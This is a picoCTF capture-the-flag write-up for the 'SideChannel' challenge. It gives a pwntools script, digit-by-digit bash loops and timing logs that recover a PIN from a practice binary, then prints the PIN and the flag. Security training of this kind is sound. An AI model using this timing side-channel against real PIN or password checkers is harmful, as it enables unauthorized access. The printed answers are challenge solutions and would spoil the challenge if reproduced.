# SideChannel   

## Description

There's something fishy about this PIN-code checker, can you figure out the PIN and get the flag?
Download the PIN checker program here [pin_checker](https://artifacts.picoctf.net/c/145/pin_checker)
Once you've figured out the PIN (and gotten the checker program to accept it), connect to the master server using nc saturn.picoctf.net 52680 and provide it the PIN to get your flag.


## Hint(s)

1. Read about "timing-based side-channel attacks."
2. Attempting to reverse-engineer or exploit the binary won't help you, you can figure out the PIN just by interacting with it and measuring certain properties about it.
3. Don't run your attacks against the master server, it is secured against them. The PIN code you get from the pin_checker binary is the same as the one for the master server.

## Writeup 

As the name suggests, this name is about timing-based attacks. 
**Make sure you read about the attack [here](https://medium.com/spidernitt/introduction-to-timing-attacks-4e1e8c84b32b)**

Anyway, we are given an executable file. We have to figure out how much time it takes for the file to return an answer after we input our PIN code. 
Time to get coding!

I found this script from this [write-up](https://dev.to/lambdamamba/ctf-writeup-picoctf-2022-forensics-55p3#side). This script does the job perfectly :
```py
from pwn import *
import time
import sys

io = process(['./pin_checker'])
context.arch = 'amd64'
gs = '''
continue
'''

pin = str(sys.argv[1])


io.sendline(pin)

io.recvline()
io.recvline()
io.recvline()

start = time.time()
recevied4 = io.recvline()

stop = time.time()
time_taken = stop - start

log.info(f"Time taken: {time_taken}")
log.info(f"Received4: {recevied4}")
log.info(f"Guess: {pin}")

sys.exit()
```
We can start with inputting 100000000 which returns : 

```
$ python3 exploit.py 10000000                                                                             
[+] Starting local process './pin_checker': pid 1508
[*] Time taken: 0.3032264709472656
[*] Received4: b'Access denied.\n'
[*] Guess: 10000000
[*] Stopped process './pin_checker' (pid 1508)
```
Now, If we were to manually run the script over and over it'd take a long time. So i wrote a simple bash script that does this for us.
```sh
#!/bin/bash

python3 exploit.py 00000000
python3 exploit.py 10000000
python3 exploit.py 20000000
python3 exploit.py 30000000
python3 exploit.py 40000000
python3 exploit.py 50000000
python3 exploit.py 60000000
python3 exploit.py 70000000
python3 exploit.py 80000000
python3 exploit.py 90000000
```
Now running this returns : 
```
[+] Starting local process './pin_checker': pid 1544

[*] Time taken: 0.1728212833404541
[*] Received4: b'Access denied.\n'
[*] Guess: 00000000
[*] Process './pin_checker' stopped with exit code 1 (pid 1544)
[+] Starting local process './pin_checker': pid 1548

[*] Time taken: 0.1890273094177246
[*] Received4: b'Access denied.\n'
[*] Guess: 10000000
[*] Process './pin_checker' stopped with exit code 1 (pid 1548)
[+] Starting local process './pin_checker': pid 1552

[*] Time taken: 0.20344209671020508
[*] Received4: b'Access denied.\n'
[*] Guess: 20000000
[*] Process './pin_checker' stopped with exit code 1 (pid 1552)
[+] Starting local process './pin_checker': pid 1556

[*] Time taken: 0.2079334259033203
[*] Received4: b'Access denied.\n'
[*] Guess: 30000000
[*] Process './pin_checker' stopped with exit code 1 (pid 1556)
[+] Starting local process './pin_checker': pid 1560

[*] Time taken: 0.3650705814361572
[*] Received4: b'Access denied.\n'
[*] Guess: 40000000
[*] Process './pin_checker' stopped with exit code 1 (pid 1560)
[+] Starting local process './pin_checker': pid 1564

[*] Time taken: 0.1933596134185791
[*] Received4: b'Access denied.\n'
[*] Guess: 50000000
[*] Process './pin_checker' stopped with exit code 1 (pid 1564)
[+] Starting local process './pin_checker': pid 1568

[*] Time taken: 0.196638822555542
[*] Received4: b'Access denied.\n'
[*] Guess: 60000000
[*] Process './pin_checker' stopped with exit code 1 (pid 1568)
[+] Starting local process './pin_checker': pid 1572

[*] Time taken: 0.1914525032043457
[*] Received4: b'Access denied.\n'
[*] Guess: 70000000
[*] Process './pin_checker' stopped with exit code 1 (pid 1572)
[+] Starting local process './pin_checker': pid 1576

[*] Time taken: 0.19887447357177734
[*] Received4: b'Access denied.\n'
[*] Guess: 80000000
[*] Process './pin_checker' stopped with exit code 1 (pid 1576)
[+] Starting local process './pin_checker': pid 1580

[*] Time taken: 0.1977241039276123
[*] Received4: b'Access denied.\n'
[*] Guess: 90000000
[*] Process './pin_checker' stopped with exit code 1 (pid 1580)
```

As we can clearly see, **40000000** took the longest time. 
Then we update our bash script
```sh
#!/bin/bash

python3 exploit.py 40000000
python3 exploit.py 41000000
python3 exploit.py 42000000
python3 exploit.py 43000000
python3 exploit.py 44000000
python3 exploit.py 45000000
python3 exploit.py 46000000
python3 exploit.py 47000000
python3 exploit.py 48000000
python3 exploit.py 49000000
```

We keep doing this untill we get the right pin!
```
[+] Starting local process './pin_checker': pid 1619
[*] Time taken: 1.5294091701507568
[*] Received4: b'Access granted. You may use your PIN to log into the master server.\n'
[*] Guess: 48390513
[*] Process './pin_checker' stopped with exit code 1 (pid 1619)
```
And then we connect to the master server,
```
nc saturn.picoctf.net 52680
```
Input the PIN code and get the flag!
```
$ nc saturn.picoctf.net 52680
Verifying that you are a human...
Please enter the master PIN code:
48390513
Password correct. Here's your flag:
picoCTF{t1m1ng_4tt4ck_914c5ec3}
```

One of my favorite challenges so far. The concept of time based attacks is just amazing.
